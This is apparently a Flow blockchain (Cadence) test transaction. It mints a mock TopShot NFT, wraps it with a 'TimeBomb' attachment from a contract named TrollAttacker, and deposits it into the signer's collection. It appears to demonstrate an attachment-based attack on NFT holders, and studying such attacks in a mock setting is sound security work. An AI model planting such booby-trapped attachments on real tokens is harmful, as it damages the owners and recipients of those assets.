import NonFungibleToken from "../contracts/utility/NonFungibleToken.cdc"
import MockTopShot from "../contracts/MockTopShot.cdc"
import TrollAttacker from "../contracts/TrollAttacker.cdc"

transaction {
    
    let receiverRef: &MockTopShot.Collection{NonFungibleToken.Receiver}
    
    prepare(signer: AuthAccount) {
        if signer.borrow<&MockTopShot.Collection>(from: MockTopShot.CollectionStoragePath) == nil {
            signer.save(<-MockTopShot.createEmptyCollection(), to: MockTopShot.CollectionStoragePath)
            signer.link<
                &MockTopShot.Collection{MockTopShot.CollectionPublic, NonFungibleToken.Receiver, NonFungibleToken.CollectionPublic}
            >(
                MockTopShot.CollectionPublicPath,
                target: MockTopShot.CollectionStoragePath
            )
        }
        self.receiverRef = signer.getCapability<
                &MockTopShot.Collection{NonFungibleToken.Receiver}
            >(
                MockTopShot.CollectionPublicPath
            ).borrow()!
    }

    execute {
        // Adding TimeBomb attachment in same line as minting to Receiver
        self.receiverRef.deposit(token: <-TrollAttacker.addTimeBomb(toNFT: <-MockTopShot.mintNFT()))
    }
}
